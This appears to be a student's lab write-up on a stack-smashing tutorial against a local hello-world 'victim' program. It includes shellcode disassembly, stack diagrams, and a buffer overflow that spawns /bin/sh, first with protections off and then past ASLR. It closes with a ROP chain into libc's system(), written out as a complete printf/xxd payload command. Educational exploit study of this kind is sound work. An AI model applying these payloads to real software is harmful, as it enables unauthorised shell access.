
# Overview

The aim of this project is to demonstrate a basic stack smashing attack on a simple Hello World program. Though this is simple, it's also a good overview how a buffer overflow can be used to gain shell access, and also walks us through the protections the operating system has to protect from these attacks.

For this project, I’m using a relatively newer installation of Arch. This means that I may run into trouble with, as the top of this tutorial indicates, newer versions of Linux.

> Throughout each step, there will be an indentation indicating a script or
> command that executes everything mentioned in that step.

### Some assembly required
I began by compiling and running the provided shell.c code.

> Use the provided Makefile:
```
make
```

Understanding the assembly code: it seems to load the string bin/sh into somewhere in memory, and then executes it by using the sys call command, which I think executes whatever is in a certain register. I also understand the idea of labeling and using the hex code 0xdeadbeef to mark where in memory it is.

At first, I did not think that it was working at all. I began to do the rest and was running into trouble. Then I discovered that it was running the whole time and I’d been trying to do the rest of the commands from within the execvp shell! (It seemed to be missing some environment variables).

(Note: On Arch, when I run objdump, the output is different from what the tutorial indicates it should be. Instead of one line with ``` 4004d6:       69 6e 2f 73 68 00 ef    imul ```, my output is spread into multiple lines, which I guess must be some kind of breaking down of the operation. When I run “cat shell code” it is the same, however. Upon switching to Ubuntu it is the same.)

The entire program dumps to:
```
00000000004004aa <needle0>:
  4004aa:	eb 0e                	jmp    4004ba <there>

00000000004004ac <here>:
  4004ac:	5f                   	pop    %rdi
  4004ad:	48 31 c0             	xor    %rax,%rax
  4004b0:	b0 3b                	mov    $0x3b,%al
  4004b2:	48 31 f6             	xor    %rsi,%rsi
  4004b5:	48 31 d2             	xor    %rdx,%rdx
  4004b8:	0f 05                	syscall 

00000000004004ba <there>:
  4004ba:	e8 ed ff ff ff       	callq  4004ac <here>
  4004bf:	2f                   	(bad)  
  4004c0:	62                   	(bad)  
  4004c1:	69                   	.byte 0x69
  4004c2:	6e                   	outsb  %ds:(%rsi),(%dx)
  4004c3:	2f                   	(bad)  
  4004c4:	73 68                	jae    40052e <__libc_csu_init+0x4e>
	...
```

> The necessary shellcode file can be produced by running:
```
./theshellgame.sh
```

### Learn Bad C in only 1 hour!
The victim.c code seems fairly simple. All it does is take in a char array and print it. Of course, if we overflow the array, fun can happen…
Also: It is impressive how extensive the protections that the OS puts in are these days. I can see how all the things we are disabling would make our ROP attack impossible: if we can’t find or execute our code, our attack is worthless. Successful exploits on a live machine must be very complicated.

Here is a simple diagram of how our code is trying to work. We're attempting to turn:
```
 _______________
|name array     |<- &name
|(64 bytes)     |
|               |
|_______________|
|RBP (8 bytes)  |
|ReturnAddr     |
```
into:

```
 _______________
|shellcode      |<- &name
|(32 bytes)     |
|0 (32 bytes    |
|_______________|
|0 (8 bytes)  	|
|&name			|

```

_(Sam: I had to use “x86_64” for the architecture since my Arch install did not recognize the ‘arch’ architecture. My address was 0x7fffffffe5a0.)_

That way, when the program finishes, it goes to execute the address of shellcode, instead of the return address.

> Run the following script:
```
./learnbadc_in1hour.sh
```
Hit enter until you are greated with "Hello, �_H1��;H1�H1������/bin/sh!"
Success! you are in a shell that was executed unintentionally by the hello
world program. Run some commands. To exit the shell, run exit a couple of
times, or hit CTRL-C

### The importance of being patched:
Now we try to exploit the code with ASLR re-enabled. This means that we cannot rely on the address of ```name``` being constant. Instead, we must calculate where it is every time in order to do the same thing as we did before.

The code breaks down as follows:
First, obtain the address of the code in memory using the ps command. Then use the program to print out the location of the char array. Find out the offset to know how far you have to write the buffer to overflow it. Just as with the example, my code was 88 away from the address.

Next, the xxd script inserts the entire shell script as an input in the char array. This, followed by 40 zeros and the address of the _name_ array, once again causes the program to jump to and execute the stored therein (which launches ```/bin/sh```) This is the same kind of buffer overflow as the previous one. What this exploit offers over the first is it defeats ASLR, by dynamically finding the address of the program in memory.

Note: Upon visual inspection, it seems my version of Ubuntu organizes the stack at a different position in memory than the example code assumed. Specifically, the tutorial assumed that it would be prefixed with ```0x7fff```, and that would be the offset that the stack pointer offsets from. (That’s why it does ``0x7fff$sp+88``). I noticed that sometimes my program would be running at ```0x7ffe```, however, and that is why it was failing. If I hardcode that prefix when running the exploit, I successfully get a shell. So we require a bit of visual inspection to find which script to run. 

>This doesn't work everytime because of the prefix not always being 0x7fff
```
./theimportanceofbeingpatched.sh
```
When the prefix is 0x7fff, it works. The output is the same as when it doesn't
work, but yo can time commands and the other terminal will be running it. To
see the action, in another terminal run:
```
tmux attach -t $USER
```
lol. When you are done having fun, go back to the original terminal and exit
with CTRL-D

### Go-go-gadgets:
For the last part, we try to defeat the no-execute protection on our system. That means we can no longer just stick the code we want onto the stack to run it; stack memory becomes unexecutable. We need to get more clever than that.

What we can use is the system's own code! If we manipulate the return address of our program to run to already-loaded code, such as that from libc. Using our stack diagram:
```
 _______________
|0 (32 bytes)	|<- &name
|			|
|0 (32 bytes    |
|_______________|
|0 (8 bytes)  	|
|&addr of gadget|
|"/bin/sh"		|
|&addr of gadget|
|...			|
```
When the program returns, it does not jump to the right place. Instead, it jumps to a gadget, which is a chunk of code that performs things we want. All we want is to pop the bin/sh string onto a register, and then make a syscall such that it executes. We use libc's code for that, found the first assembly that fit, and jumped to it.

Specifically, I used the revised code linked at the top of the page. Using this, I generated code based on the linked code. The variables we had were:

```
buffer:		0x7fffffffe5a0										//Location of the char buffer 
libc: 		0x7ffff7a15000										//Location of libc on our system
system:		0x7ffff7a15000 + 0x46590 = 0x7ffff7a5b590			//Location of the system
gadgets:	0x7ffff7a15000 + 0x22b9a = 0x7ffff7a37b9a			//Location of the desired gadget
bash: 		0x7fffffffe5a0 + 64d + 8d + 24d = 0x7fffffffe600 	//Location of our /bin/sh string
```
The code we used to use the ROP exploit was therefore:

```
(((printf %0144d 0; printf %016x 0x7ffff7a37b9a | tac -rs..; printf %016x 0x7fffffffe600 | tac -rs..; printf %016x 0x7ffff7a5b590 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
```

Which loads the right addresses onto the stack! This allows the program to return to the gadget instead of the OS, which executes our program!

> Run the following command:
```
./gogadgetgo.sh
```
When you are asked for your name, just press enter. You'll be greated by the
hello world program, but it returns to sh, which is waiting for your command.
When you are done, CTRL-D out of there
